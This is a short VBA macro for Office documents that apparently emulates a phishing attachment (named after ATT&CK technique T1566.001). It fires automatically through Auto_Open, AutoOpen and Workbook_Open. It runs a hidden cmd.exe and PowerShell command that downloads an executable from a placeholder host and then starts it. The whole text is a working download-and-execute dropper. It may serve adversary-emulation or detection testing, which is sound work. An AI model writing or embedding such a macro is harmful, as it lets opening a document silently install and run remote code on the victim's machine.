Sub Auto_Open()
    EXE
End Sub
Sub EXE()
    Run = Shell("cmd.exe /c PowerShell (New-Object System.Net.WebClient).DownloadFile('http://<host>:<port>/T1566_001.exe','T1566_001.exe');Start-Process 'T1566_001.exe'", vbHide)
End Sub
Sub AutoOpen()
    Auto_Open
End Sub
Sub Workbook_Open()
    Auto_Open
End Sub